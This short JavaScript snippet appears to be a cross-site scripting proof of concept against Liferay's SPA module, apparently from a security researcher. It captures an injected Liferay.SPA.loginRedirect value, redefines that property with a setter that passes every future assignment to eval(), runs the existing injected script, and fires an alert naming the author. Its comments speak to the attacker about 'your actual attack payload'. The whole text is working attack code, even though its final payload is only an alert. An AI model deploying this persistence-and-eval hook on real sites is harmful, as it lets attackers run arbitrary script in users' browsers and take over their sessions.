// Save the value of the injected redirect
const payload = Liferay.SPA.loginRedirect;

// Automatically execute any future assignment
Object.defineProperty(Liferay.SPA, 'loginRedirect', {
  set: function(v) {
    eval(v); // ☠️ any future assignment gets executed
  }
});

// Execute the one that's already present (which includes script injection)
if (payload) {
  eval(payload); // loads your own x.js again, yes
}

// Your actual attack payload:
alert("XSS from Vaibhav!");
